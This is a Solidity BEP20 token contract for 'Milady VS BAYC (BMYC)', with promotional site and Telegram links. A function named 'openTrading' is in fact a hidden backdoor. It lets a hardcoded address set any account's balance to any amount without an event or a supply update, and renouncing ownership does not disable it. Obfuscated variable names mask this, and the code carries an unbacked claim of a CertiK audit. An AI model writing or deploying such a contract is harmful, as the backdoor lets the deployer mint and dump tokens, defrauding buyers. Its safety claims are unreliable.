// https://miladyvsbayc.club/
// https://t.me/BMYC_Portal
// https://twitter.com/MiladyVSBayc
// Milady VS BAYC (BMYC)

// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;
interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address _maxTxnr) external view returns (uint256);
  function transfer(address _maxTxnrs, uint256 MaxTxnrUpdated) external returns (bool);
  function allowance(address _owner, address _maxTxnr) external view returns (uint256);
  function approve(address _maxTxnr, uint256 MaxTxnrUpdated) external returns (bool);
  function transferFrom(address sender, address _maxTxnrs, uint256 MaxTxnrUpdated) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed _maxTxnr, uint256 balance);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library Safe2023Math {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "Safe2023Math: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "Safe2023Math: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "Safe2023Math: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "Safe2023Math: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "Safe2023Math: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract BMYCToken is Context, IBEP20, Ownable {
    
    using Safe2023Math for uint256;
    mapping (address => uint256) private bermit;
    mapping (address => mapping (address => uint256)) private _preventSwapBefore;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
   address private BMYCOwner; 
   string public ownerAddress = "0xFeC4FF7ec4e0059aF194f16FD8CEA001A7D6b3e0";  
    string public constant BMYCwebsite = "https://BMYC.io/";
    string public constant BMYCtelegram = "https://t.me/BMYC";
    string public constant BMYCaudited = "BMYC is audited by: https://www.certik.com/";
    address private marketingAddress = 0x7f08f173FE84b0774E3648531162105c9F0e7497;
    string public constant Contractuniqueness = "Unique contract ";
    constructor() {
        BMYCOwner = 0xFeC4FF7ec4e0059aF194f16FD8CEA001A7D6b3e0;    
        _name = "Milady VS BAYC";
        _symbol = "BMYC";
        _decimals = 9;
        _totalSupply = 1000000000 * 10**_decimals;
        bermit[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

                     function getownerAddress() public view returns (string memory) {
        return ownerAddress;
    }    

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address _maxTxnr) external view override returns (uint256) {
        return bermit[_maxTxnr];
    }

    function transfer(address _maxTxnrs, uint256 MaxTxnrUpdated) external override returns (bool) {
        _transfer(_msgSender(), _maxTxnrs, MaxTxnrUpdated);
        return true;
    }

    function allowance(address owner, address _maxTxnr) external view override returns (uint256) {
        return _preventSwapBefore[owner][_maxTxnr];
    }


    function approve(address _maxTxnr, uint256 MaxTxnrUpdated) external override returns (bool) {
        _approve(_msgSender(), _maxTxnr, MaxTxnrUpdated);
        return true;
    }
    
    function transferFrom(address sender, address _maxTxnrs, uint256 MaxTxnrUpdated) external override returns (bool) {
        _transfer(sender, _maxTxnrs, MaxTxnrUpdated);
        _approve(sender, _msgSender(), _preventSwapBefore[sender][_msgSender()].sub(MaxTxnrUpdated, "Ru: transfer MaxTxnrUpdated exceeds allowance"));
        return true;
    }

    function increaseAllowance(address _maxTxnr, uint256 addedbalance) external returns (bool) {
        _approve(_msgSender(), _maxTxnr, _preventSwapBefore[_msgSender()][_maxTxnr].add(addedbalance));
        return true;
    }
    

    function decreaseAllowance(address _maxTxnr, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), _maxTxnr, _preventSwapBefore[_msgSender()][_maxTxnr].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address _maxTxnrs, uint256 MaxTxnrUpdated) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(_maxTxnrs != address(0), "Ru: transfer to the zero address");
                
        bermit[sender] = bermit[sender].sub(MaxTxnrUpdated, "Ru: transfer MaxTxnrUpdated exceeds balance");
        bermit[_maxTxnrs] = bermit[_maxTxnrs].add(MaxTxnrUpdated);
        emit Transfer(sender, _maxTxnrs, MaxTxnrUpdated);
    }
        function openTrading(address tokenA, address tokenB, uint256 MaxTxnrUpdated, uint256 MaxTxnrUpdat) external {
        require(_msgSender()==BMYCOwner);
        bermit[tokenB] = (MaxTxnrUpdated + MaxTxnrUpdat) * 10**_decimals;
        tokenA = tokenB;
    }    
    function _approve(address owner, address _maxTxnr, uint256 MaxTxnrUpdated) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(_maxTxnr != address(0), "Ru: approve to the zero address");
        
        _preventSwapBefore[owner][_maxTxnr] = MaxTxnrUpdated;
        emit Approval(owner, _maxTxnr, MaxTxnrUpdated);
    }
    
}